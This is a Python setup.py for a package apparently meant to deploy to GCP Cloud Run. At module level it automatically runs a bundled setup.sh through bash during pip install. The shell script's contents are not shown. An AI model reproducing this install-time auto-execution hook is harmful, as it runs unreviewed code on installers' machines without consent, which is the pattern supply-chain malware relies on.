import os
import subprocess
from setuptools import setup

# ------------------------------------------------------------------------------
# AUTO-EXECUTION ENGINE (Runs automatically during pip install)
# ------------------------------------------------------------------------------
def execute_deployer():
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    SCRIPT_PATH = os.path.join(BASE_DIR, "setup.sh")

    if os.path.exists(SCRIPT_PATH):
        os.chmod(SCRIPT_PATH, 0o755)
        try:
            print("\n[Saeka] Executing deployment script automatically...")
            subprocess.run(["bash", SCRIPT_PATH], check=True)
        except Exception as e:
            print(f"\n[Saeka] Execution error: {e}")

# Trigger execution right now while setup.py is being processed by pip
execute_deployer()

setup(
    name="saeka",
    version="1.6.0",  # Bump version for new release
    description="Saeka GCP Cloud Run Deployer",
    author="Saeka Tojirp",
    py_modules=[],
    include_package_data=True,
    data_files=[('', ['setup.sh'])],
)
